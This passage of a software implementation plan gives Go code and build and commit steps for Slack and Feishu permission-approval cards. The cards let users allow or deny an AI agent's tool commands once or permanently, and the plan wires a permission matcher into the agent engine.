							Content: fmt.Sprintf("操作人: %s  |  %s", data.UserID, time.Now().Format("15:04:05")),
							Tag:    TextTypeLarkMD,
						},
					},
				},
			},
			// Buttons go inside a CardElement with Type: ElementAction
			{
				Type: ElementAction,
				Actions: []CardAction{
					{
						Type: ButtonTypePrimary,
						Text: &Text{
							Content: "\u2705 Allow Once",
							Tag:    TextTypePlainText,
						},
						Value: allowOnceValue,
					},
					{
						Type: ButtonTypePrimary,
						Text: &Text{
							Content: "\U0001F512 Allow Always",
							Tag:    TextTypePlainText,
						},
						Value: allowAlwaysValue,
					},
				},
			},
			{
				Type: ElementAction,
				Actions: []CardAction{
					{
						Type: ButtonTypeDanger,
						Text: &Text{
							Content: "\U0001F6AB Deny Once",
							Tag:    TextTypePlainText,
						},
						Value: denyOnceValue,
					},
					{
						Type: ButtonTypeDanger,
						Text: &Text{
							Content: "\u26D4 Deny All",
							Tag:    TextTypePlainText,
						},
						Value: denyAllValue,
					},
				},
			},
		},
	}
}

// BuildPermissionResultCard builds the result card after user decision.
func BuildPermissionResultCard(decision, tool, command string) *CardTemplate {
	var template, title, description string
	switch decision {
	case "allow", "allow_once":
		template = CardTemplateGreen
		title = "\u2705 已允许（本次）"
		description = fmt.Sprintf("工具 `%s` 的本次执行已被允许。", tool)
	case "allow_always":
		template = CardTemplateGreen
		title = "\U0001F512 已永久允许"
		description = fmt.Sprintf("`%s` 已被添加到白名单，后续无需审批。", tool)
	case "deny", "deny_once":
		template = CardTemplateRed
		title = "\U0001F6AB 已拒绝（本次）"
		description = fmt.Sprintf("工具 `%s` 的本次执行已被拒绝。", tool)
	case "deny_all":
		template = CardTemplateRed
		title = "\u26D4 已永久拒绝"
		description = fmt.Sprintf("`%s` 已被添加到黑名单，后续请求将被自动拦截。", tool)
	default:
		template = CardTemplateOrange
		title = "\u23F3 已取消"
		description = "操作已取消。"
	}

	return &CardTemplate{
		Config: &CardConfig{
			WideScreenMode: false,
			EnableForward:  true,
		},
		Header: &CardHeader{
			Template: template,
			Title: &Text{
				Content: title,
				Tag:     TextTypePlainText,
			},
		},
		Elements: []CardElement{
			{
				Type: ElementDiv,
				Text: &Text{
					Content: fmt.Sprintf("%s\n\n**命令:**\n```%s```", description, command),
					Tag:    TextTypeLarkMD,
				},
			},
			{
				Type: ElementNote,
				Elements: []CardElement{
					{
						Type: ElementMarkdown,
						Text: &Text{
							Content: "决策时间：" + time.Now().Format("2006-01-02 15:04:05"),
							Tag:    TextTypeLarkMD,
						},
					},
				},
			},
		},
	}
}

// BuildPermissionDeniedCard builds a read-only card for CLI permission_denials.
func BuildPermissionDeniedCard(tool, command, reason string) *CardTemplate {
	return &CardTemplate{
		Config: &CardConfig{
			WideScreenMode: false,
			EnableForward:  true,
		},
		Header: &CardHeader{
			Template: CardTemplateOrange,
			Title: &Text{
				Content: "\u26A0\uFE0F 权限被拒绝（CLI）",
				Tag:     TextTypePlainText,
			},
		},
		Elements: []CardElement{
			{
				Type: ElementDiv,
				Text: &Text{
					Content: fmt.Sprintf("**工具:** `%s`\n\n**命令:**\n```%s```\n\n**原因:** %s\n\n请联系管理员调整权限配置。", tool, command, reason),
					Tag: TextTypeLarkMD,
				},
			},
		},
	}
}
```

- [ ] **Step 2: Verify compilation**

Run: `go build ./chatapps/feishu/...`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add chatapps/feishu/permission_card.go
git commit -m "feat(permission): add Feishu permission card builders"
```

---

## Chunk 6: Extend Interactive Handlers

**Files:**
- Modify: `chatapps/slack/interactive.go` (extend `handleBlockActions` and `handlePermissionCallback`)
- Modify: `chatapps/feishu/interactive_handler.go` (extend action routing for new action IDs)
- Modify: `chatapps/base/danger_registry.go` (add `PermissionApprovalRegistry`)

- [ ] **Step 1: Add PermissionApprovalRegistry to danger_registry.go**

```go
package base

import "sync"

// PermissionCardData holds the shared data for building permission cards.
// Defined in base so both Slack and Feishu adapters can use it.
type PermissionCardData struct {
	BotID, SessionID, MessageID, UserID, Tool, Command string
}

// PermissionApprovalRegistry manages pending permission approvals for the new
// permission card flow (Allow Once / Deny Once — no persistence).
// Mirrors DangerApprovalRegistry but for permission-specific decisions.
type PermissionApprovalRegistry struct {
	pending sync.Map // sessionID → chan PermissionDecision
}

// PermissionDecision represents the user's permission decision.
type PermissionDecision struct {
	Allow  bool
	Reason string // "allow_once", "allow_always", "deny_once", "deny_all"
}

// GlobalPermissionRegistry is the singleton registry for permission approvals.
var GlobalPermissionRegistry = &PermissionApprovalRegistry{}

// RegisterPermission creates a pending permission channel for the given sessionID.
func (r *PermissionApprovalRegistry) RegisterPermission(sessionID string) chan PermissionDecision {
	ch := make(chan PermissionDecision, 1)
	r.pending.Store(sessionID, ch)
	return ch
}

// ResolvePermission resolves a pending permission for the given sessionID.
func (r *PermissionApprovalRegistry) ResolvePermission(sessionID string, decision PermissionDecision) bool {
	if val, ok := r.pending.LoadAndDelete(sessionID); ok {
		ch := val.(chan PermissionDecision)
		ch <- decision
		return true
	}
	return false
}

// CancelPermission removes a pending permission without resolving it.
func (r *PermissionApprovalRegistry) CancelPermission(sessionID string) {
	r.pending.Delete(sessionID)
}

// GlobalPermissionContext stores tool+command context for each actionID.
// This is needed because Slack button Value fields can only carry strings,
// so we store the full "tool:command" pattern in memory keyed by actionID.
// The callback retrieves it via LoadPermissionContext and then deletes it.
var GlobalPermissionContext sync.Map

// StorePermissionContext stores context for an actionID.
func StorePermissionContext(actionID, toolCommand string) {
	GlobalPermissionContext.Store(actionID, toolCommand)
}

// LoadPermissionContext retrieves and deletes context for an actionID.
func LoadPermissionContext(actionID string) (string, bool) {
	val, ok := GlobalPermissionContext.LoadAndDelete(actionID)
	if !ok {
		return "", false
	}
	return val.(string), true
}
```

- [ ] **Step 2: Extend Slack `handleBlockActions` for new action IDs**

Add to `chatapps/slack/interactive.go`, in `handleBlockActions`, before the existing `perm_allow/perm_deny` branch:

```go
// New permission action IDs: perm_allow_once, perm_allow_always,
// perm_deny_once, perm_deny_all
if strings.HasPrefix(actionID, "perm_allow_once") ||
   strings.HasPrefix(actionID, "perm_allow_always") ||
   strings.HasPrefix(actionID, "perm_deny_once") ||
   strings.HasPrefix(actionID, "perm_deny_all") {
    a.handleNewPermissionCallback(callback, action, w)
    return
}
```

- [ ] **Step 3: Implement `handleNewPermissionCallback` in `chatapps/slack/interactive.go`**

Add this method to the slack package. It handles the 4-button flow, persists whitelist/blacklist for `_always`/`_all` variants, and calls `engine.SetAllowedTools()` for `allow_always`:

```go
// handleNewPermissionCallback handles the new 4-button permission flow.
// ActionID format: perm_{action}:{sessionID}:{messageID}
// action ∈ {allow_once, allow_always, deny_once, deny_all}
func (a *Adapter) handleNewPermissionCallback(callback *SlackInteractionCallback, action SlackAction, w http.ResponseWriter) {
	userID := callback.User.ID
	channelID := callback.Channel.ID
	messageTS := callback.Message.Ts
	actionID := action.ActionID

	a.Logger().Info("New permission callback received",
		"user_id", userID,
		"channel_id", channelID,
		"action_id", actionID,
	)

	// Parse actionID: perm_{action}:{sessionID}:{messageID}
	parts := strings.Split(actionID, ":")
	if len(parts) != 3 {
		a.Logger().Error("Invalid permission action_id", "action_id", actionID)
		w.WriteHeader(http.StatusOK)
		return
	}

	fullAction := parts[0] // e.g. "perm_allow_once"
	sessionID := parts[1]
	msgID := parts[2]

	// Extract actual action (strip "perm_" prefix)
	actionType := strings.TrimPrefix(fullAction, "perm_")

	// Retrieve tool+command from in-memory context (stored when card was built)
	toolCmd, hasCtx := base.LoadPermissionContext(actionID)
	if !hasCtx && (actionType == "allow_always" || actionType == "deny_all") {
		a.Logger().Warn("No permission context found for actionID, skipping persistence", "action_id", actionID)
	}

	// Determine behavior (allow/deny) and persist decision
	var behavior string
	if actionType == "allow_once" || actionType == "allow_always" {
		behavior = "allow"
	} else {
		behavior = "deny"
	}

	// Send to engine via session input
	if a.eng != nil {
		if sess, ok := a.eng.GetSession(sessionID); ok {
			response := map[string]any{
				"type":       "permission_response",
				"message_id": msgID,
				"behavior":   behavior,
			}
			_ = sess.WriteInput(response)
		}
	}

	// Persist whitelist/blacklist for _always/_all variants
	// Note: botID must match the bot's own userID (e.g. "U0AHRCL1KCM"), not "platform_userID".
	// Slack adapter exposes botID via a.config.BotUserID.
	botID := a.config.BotUserID
	if a.eng != nil && (actionType == "allow_always" || actionType == "deny_all") && hasCtx {
		pm := a.eng.PermissionMatcher()
		if pm != nil {
			if actionType == "allow_always" {
				_ = pm.AddWhitelist(botID, toolCmd, userID)
				// Allow Always: add tool to AllowedTools for new sessions.
				// Note: current running session is unaffected (AllowedTools is applied at
				// session startup); only sessions started after this call see the update.
				toolName := strings.SplitN(toolCmd, ":", 2)[0]
				allowedTools := a.eng.GetAllowedTools()
				found := false
				for _, t := range allowedTools {
					if t == toolName {
						found = true
						break
					}
				}
				if !found {
					a.eng.SetAllowedTools(append(allowedTools, toolName))
				}
			} else {
				_ = pm.AddBlacklist(botID, toolCmd, userID)
			}
		}
	}

	// Update card to result state
	// tool/command are unknown here since we only have actionID; use generic result
	blocks := BuildPermissionResultBlocks(actionType, "", "")
	if err := a.UpdateMessageSDK(context.Background(), channelID, messageTS, blocks, ""); err != nil {
		a.Logger().Error("Update permission result card failed", "cause", err)
	}

	w.WriteHeader(http.StatusOK)
}
```

- [ ] **Step 4: Extend Feishu `handleButtonCallbackInternal` for new action IDs**

In `chatapps/feishu/interactive_handler.go`, update `handleButtonCallbackInternal` routing, then add `handleNewPermissionCallback`.

**Important: existing code fix — `context.Background()` goroutine leak in `handlePermissionCallbackInternal`**

The existing `handlePermissionCallbackInternal` (lines 157-183 of `interactive_handler.go`) uses `context.Background()` both inline and in a goroutine. Per CLAUDE.md §2.1 (no fire-and-forget goroutines), pass `r.Context()` from `HandleInteractive` through the call chain instead:

```go
// HandleInteractive: change handleButtonCallbackInternal signature to accept ctx
func (h *InteractiveHandler) handleButtonCallbackInternal(event *InteractiveEvent, ctx context.Context) {
    // ...
}

// handlePermissionCallbackInternal: use ctx instead of context.Background()
func (h *InteractiveHandler) handlePermissionCallbackInternal(event *InteractiveEvent, actionValue *ActionValue, ctx context.Context) {
    // ctx (not context.Background()) used for token fetch; goroutine also uses ctx
    go func() {
        if err := h.UpdatePermissionCard(ctx, ...); err != nil {
```

Do NOT use `context.Background()` for request-bound async operations.

```go
// handleButtonCallbackInternal decodes the raw action JSON and routes to the appropriate handler.
func (h *InteractiveHandler) handleButtonCallbackInternal(event *InteractiveEvent) {
	rawValue := event.Event.Action.Value

	// Decode raw button value into ActionValueWithContext (contains tool+command for permission cards)
	av, err := DecodeActionValueWithContext(rawValue)
	if err != nil {
		h.logger.Error("Decode action value failed", "error", err)
		return
	}

	switch av.Action {
	case "permission_request":
		// Existing handler: pass only the simple ActionValue fields
		h.handlePermissionCallbackInternal(event, &ActionValue{
			Action:    av.Action,
			SessionID: av.SessionID,
			MessageID: av.MessageID,
		})
	case "perm_allow_once", "perm_allow_always", "perm_deny_once", "perm_deny_all":
		// New 4-button handler: pass full ActionValueWithContext with tool+command
		h.handleNewPermissionCallback(event, av)
	default:
		h.logger.Warn("Unknown action type", "action", av.Action)
	}
}
```

**Important:** The existing `interactive_handler.go`'s `handleButtonCallbackInternal` already unmarshals into `ActionValue` (which lacks `Tool`/`Command`). The fix above replaces that entire method to decode raw JSON into `ActionValueWithContext` directly. This is the correct approach since the button value is the full JSON string (not a simple action name).

Add `handleNewPermissionCallback` method to `InteractiveHandler` (receives `*ActionValueWithContext` directly — no re-decoding needed):

```go
// handleNewPermissionCallback handles the new 4-button permission flow for Feishu.
// Receives *ActionValueWithContext (already decoded from raw button JSON — no re-decoding needed).
func (h *InteractiveHandler) handleNewPermissionCallback(event *InteractiveEvent, av *ActionValueWithContext) {
	chatID := event.Event.Message.ChatID
	userID := event.Event.User.UserID
	actionType := av.Action

	// Determine behavior
	var behavior string
	if actionType == "perm_allow_once" || actionType == "perm_allow_always" {
		behavior = "allow"
	} else {
		behavior = "deny"
	}

	// For _always/_all, persist whitelist/blacklist via engine if available.
	// Feishu adapter does NOT embed engine (unlike Slack); engine is injected via
	// InteractiveHandler.SetEngine (called by manager after adapter setup).
	toolCmd := av.Tool + ":" + av.Command
	if h.eng != nil && (actionType == "perm_allow_always" || actionType == "perm_deny_all") {
		pm := h.eng.PermissionMatcher()
		if pm != nil {
			botID := h.botID
			if actionType == "perm_allow_always" {
				_ = pm.AddWhitelist(botID, toolCmd, userID)
				// Allow Always: add tool to AllowedTools for new sessions.
				// Note: AllowedTools only affects sessions started after this call.
				toolName := av.Tool
				allowedTools := h.eng.GetAllowedTools()
				found := false
				for _, t := range allowedTools {
					if t == toolName {
						found = true
						break
					}
				}
				if !found {
					h.eng.SetAllowedTools(append(allowedTools, toolName))
				}
			} else {
				_ = pm.AddBlacklist(botID, toolCmd, userID)
			}
		}
	}

	// Send permission response to engine via session input.
	// If eng is nil (engine not injected), the permission decision is card-only
	// and the session will eventually timeout (best-effort UX).
	if h.eng != nil {
		if sess, ok := h.eng.GetSession(av.SessionID); ok {
			response := map[string]any{
				"type":       "permission_response",
				"message_id": av.MessageID,
				"behavior":   behavior,
			}
			_ = sess.WriteInput(response)
		}
	}

	// Update card to result state (send new card via SendInteractiveMessage).
	go func() {
		ctx := context.Background()
		card := BuildPermissionResultCard(actionType, av.Tool, av.Command)
		token, err := h.adapter.GetAppTokenWithContext(ctx)
		if err != nil {
			h.logger.Error("Get token for result card failed", "error", err)
			return
		}
		cardJSON, err := json.Marshal(card)
		if err != nil {
			h.logger.Error("Marshal result card failed", "error", err)
			return
		}
		// Use SendInteractiveMessage to send the result card as a new message
		if _, err := h.adapter.client.SendInteractiveMessage(ctx, token, chatID, string(cardJSON)); err != nil {
			h.logger.Error("Send permission result card failed", "error", err)
		}
	}()
}
```

**Note on Feishu engine access:** Unlike Slack (`a.eng`), the Feishu `*Adapter` does not embed an engine field. Add these to `InteractiveHandler`:

```go
// InteractiveHandler fields (add to struct):
eng   *engine.Engine
botID string

// SetEngine injects the engine and botID after handler creation.
func (h *InteractiveHandler) SetEngine(eng *engine.Engine, botID string) {
	h.eng = eng
	h.botID = botID
}
```

Also add to Feishu `Adapter`:
```go
// InteractiveHandler exposes the handler for manager access.
func (a *Adapter) InteractiveHandler() *InteractiveHandler {
	return a.interactiveHandler
}

// BotID returns the bot open_id, cached after first fetch.
func (a *Adapter) BotID() string {
	// Implementation: call Feishu Bot Info API (/open-apis/bot/v3/info)
	// and cache result. Returns the open_id field from the response.
}
```

Manager injection:
```go
feishuAdapter.InteractiveHandler().SetEngine(eng, feishuAdapter.BotID())
```

- [ ] **Step 5: Commit**

```bash
git add chatapps/base/danger_registry.go chatapps/slack/interactive.go chatapps/feishu/interactive_handler.go
git commit -m "feat(permission): extend interactive handlers for 4-button permission flow"
```

---

## Chunk 7: Engine Integration (`engine/runner.go`)

**Files:**
- Modify: `engine/runner.go` (add PermissionStore getter, expose `CheckPermission`)
- Modify: `engine/engine.go` (add `permissionMatcher` field)

- [ ] **Step 1: Add PermissionMatcher to Engine**

In `engine/engine.go`, add to the `Engine` struct:

```go
permissionMatcher *permission.PermissionMatcher
```

And add methods:

```go
// SetPermissionMatcher sets the permission matcher for the engine.
func (e *Engine) SetPermissionMatcher(m *permission.PermissionMatcher) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.permissionMatcher = m
}

// PermissionMatcher returns the engine's permission matcher.
func (e *Engine) PermissionMatcher() *permission.PermissionMatcher {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.permissionMatcher
}
```

- [ ] **Step 2: Commit**

```bash
git add engine/engine.go
git commit -m "feat(permission): add PermissionMatcher to Engine"
```

---

## Chunk 8: Manager Integration (`chatapps/manager.go`)

**Files:**
- Modify: `chatapps/manager.go` (initialize and inject PermissionMatcher)

- [ ] **Step 1: Add PermissionMatcher initialization**

In `AdapterManager`, add:

```go
permissionMatcher *permission.PermissionMatcher
```

In `Setup`, initialize the matcher:

```go
// Initialize permission matcher with ~/.hotplex/instances base dir
homeDir, _ := os.UserHomeDir()
permBaseDir := filepath.Join(homeDir, ".hotplex", "instances")
m.permissionMatcher = permission.NewPermissionMatcher(permBaseDir)

// Inject into engines
for _, eng := range m.engines {
    eng.SetPermissionMatcher(m.permissionMatcher)
}
```

Also, for Feishu permission callbacks to work, inject the engine into the Feishu `InteractiveHandler`. The Feishu adapter does NOT have an `eng` field (unlike Slack `*slack.Adapter`), so the engine must be injected at the `InteractiveHandler` level. After Feishu adapter creation in `Setup`, set the engine on the handler:

```go
// Feishu: inject engine into InteractiveHandler for permission callbacks
// Requires: (a) add InteractiveHandler() *InteractiveHandler getter to Feishu adapter,
// (b) add SetEngine(eng *engine.Engine, botID string) to InteractiveHandler.
if feishuAdapter, ok := m.adapters["feishu"].(*feishu.Adapter); ok {
    feishuAdapter.InteractiveHandler().SetEngine(eng, feishuAdapter.BotID())
}
```

Required additions to Feishu adapter:
1. `BotID() string` — returns the bot's `open_id` (e.g., `ou_abc123`). Cache it on first use via Feishu Bot Info API (`/open-apis/bot/v3/info`).
2. `InteractiveHandler() *InteractiveHandler` — public getter for the private `interactiveHandler` field.

- [ ] **Step 2: Commit**

```bash
git add chatapps/manager.go
git commit -m "feat(permission): integrate PermissionMatcher into AdapterManager"
```

---

## Chunk 9: WAF Integration & `permission_denials` Handling

**Files:**
- Modify: `chatapps/slack/engine_handler.go` (WAF trigger → permission card)
- Modify: `chatapps/feishu/engine_handler.go` (WAF trigger → permission card)
- Modify: `chatapps/engine_handler.go` (shared permission_denials event handling)

- [ ] **Step 1: Add WAF trigger → permission card flow**

In `chatapps/engine_handler.go`, the existing `handlePermissionDenied` (around line 1741) already processes `permission_denials`. Extend it to send the read-only `BuildPermissionDeniedCard` and update the action routing to handle new action IDs. Do NOT add a separate `HandleResultEvent` method — extend the existing flow.

**Required imports** (add to the existing import block in `engine_handler.go`):
```go
"encoding/json"
"github.com/hrygo/hotplex/chatapps/feishu"
"github.com/hrygo/hotplex/chatapps/slack"
```

First, add the routing in `SendPermissionRequest` for the 4-button flow (if not already present):

```go
// SendPermissionRequest sends a permission request card to the user.
// Returns a channel that receives the decision.
func (h *EngineHandler) SendPermissionRequest(tool, command, sessionID, msgID string) chan base.PermissionDecision {
	ch := base.GlobalPermissionRegistry.RegisterPermission(sessionID)

	// Build and send card
	cardData := base.PermissionCardData{
		Tool:      tool,
		Command:   command,
		SessionID: sessionID,
		MessageID: msgID,
	}

	// Platform-specific card sending via StreamCallback.SendPermissionCard
	if err := h.SendPermissionCard(cardData); err != nil {
		h.logger.Warn("Failed to send permission card", "error", err)
	}

	return ch
}
```

In `chatapps/engine_handler.go`, add a `SendPermissionCard` method to `StreamCallback`. This method detects the platform, gets the bot/channel/user IDs from `c.metadata`, builds platform-specific blocks, and sends them via the platform adapter:

```go
// SendPermissionCard sends a permission request card via the platform adapter.
// Implemented for Slack (interactive block card) and Feishu (interactive card).
func (c *StreamCallback) SendPermissionCard(data base.PermissionCardData) error {
	// Get platform-specific adapter
	adapter, ok := c.adapters.GetAdapter(c.platform)
	if !ok {
		return fmt.Errorf("adapter not found for platform %q", c.platform)
	}

	// Extract IDs from metadata (populated from incoming message metadata)
	botID, _ := c.metadata["bot_id"].(string)
	userID, _ := c.metadata["user_id"].(string)
	channelID, _ := c.metadata["channel_id"].(string)

	if botID == "" || channelID == "" {
		return fmt.Errorf("missing bot_id or channel_id in metadata")
	}

	switch c.platform {
	case "slack":
		// Type-assert to get access to UpdateMessageSDK
		slackAdapter, ok := adapter.(*slack.Adapter)
		if !ok {
			return fmt.Errorf("adapter is not *slack.Adapter")
		}
		blocks := slack.BuildPermissionCardBlocks(
			botID,
			data.SessionID,
			data.MessageID,
			data.Tool,
			data.Command,
			userID,
		)
		// Use UpdateMessageSDK to send the card (creates a new message)
		return slackAdapter.UpdateMessageSDK(context.Background(), channelID, "", blocks, "")
	case "feishu":
		feishuAdapter, ok := adapter.(*feishu.Adapter)
		if !ok {
			return fmt.Errorf("adapter is not *feishu.Adapter")
		}
		cardData := feishu.PermissionCardData{
			BotID:     botID,
			SessionID: data.SessionID,
			MessageID: data.MessageID,
			UserID:    userID,
			Tool:      data.Tool,
			Command:   data.Command,
		}
		card := feishu.BuildPermissionCard(cardData)
		cardJSON, err := json.Marshal(card)
		if err != nil {
			return fmt.Errorf("marshal card failed: %w", err)
		}
		token, err := feishuAdapter.GetAppTokenWithContext(context.Background())
		if err != nil {
			return fmt.Errorf("get feishu token: %w", err)
		}
		if _, err := feishuAdapter.client.SendInteractiveMessage(context.Background(), token, channelID, string(cardJSON)); err != nil {
			return fmt.Errorf("send feishu interactive card: %w", err)
		}
		return nil
	default:
		return fmt.Errorf("unsupported platform %q", c.platform)
	}
}
```

This replaces the non-existent `SlackEngineHandler` / `FeishuEngineHandler` types. The method lives on the existing `StreamCallback` and uses type assertions to get platform-specific adapters.

Note: Ensure `metadata` contains `bot_id` when `StreamCallback` is created — if missing, add it in the `NewStreamCallback` / `NewEngineHandler` call site by passing it through from the session context (`ctx.ChatBotUserID`).

- [ ] **Step 2: Handle `permission_denials` — extend existing `handlePermissionDenied`**

In `chatapps/engine_handler.go`, the existing `handlePermissionDenied` method already processes `PermissionDenials`. Extend it to use `BuildPermissionDeniedCard` for Slack and Feishu:

```go
// In the existing handlePermissionDenied, add platform-specific card sending.
// After sending the existing text message, send an interactive denied card:
// Slack (type-assert adapter to *slack.Adapter):
blocks := slack.BuildPermissionDeniedCard(denial.ToolName, toolInputStr, reason)
slackAdapter, ok := adapter.(*slack.Adapter)
if ok {
    channelID := c.metadata["channel_id"].(string)
    _ = slackAdapter.UpdateMessageSDK(ctx, channelID, "", blocks, "")
}
// Feishu (type-assert adapter to *feishu.Adapter):
card := feishu.BuildPermissionDeniedCard(denial.ToolName, toolInputStr, reason)
feishuAdapter, ok := adapter.(*feishu.Adapter)
if ok {
	token, err := feishuAdapter.GetAppTokenWithContext(ctx)
	if err == nil {
		cardJSON, _ := json.Marshal(card)
		_ = feishuAdapter.client.SendInteractiveMessage(ctx, token, channelID, string(cardJSON))
	}
}
```

**Important:** Do NOT add a new `HandleResultEvent` method. Extend the existing permission-denied handler that already exists in `chatapps/engine_handler.go`.

- [ ] **Step 3: Commit**

```bash
git add chatapps/engine_handler.go chatapps/slack/engine_handler.go chatapps/feishu/engine_handler.go
git commit -m "feat(permission): add WAF trigger and permission_denials handling"
```

---

## Chunk 10: Final Verification

**Files:**
- None (verification only)

- [ ] **Step 1: Run all tests**

Run: `go test ./internal/permission/... ./chatapps/slack/... ./chatapps/feishu/... -v -race`
Expected: All PASS

- [ ] **Step 2: Build all**

Run: `go build ./...`
Expected: All PASS

- [ ] **Step 3: Verify lint**

Run: `golangci-lint run ./internal/permission/... ./chatapps/slack/ ./chatapps/feishu/ ./engine/...`
Expected: No errors

- [ ] **Step 4: Verify design doc coverage**

Check that all design decisions from `docs/superpowers/specs/2026-03-20-interactive-permission-design.md` are implemented:
- [ ] Card buttons (Allow Once / Allow Always / Deny Once / Deny All)
- [ ] WAF Pattern trigger
- [ ] CLI permission_denials trigger
- [ ] Bot-level scope with cross-session persistence
- [ ] Update original card
- [ ] Memory + JSON dual-write storage
- [ ] Pattern format: tool:command (regex)
- [ ] Hot update via SetAllowedTools (新会话立即生效，当前会话不受影响)
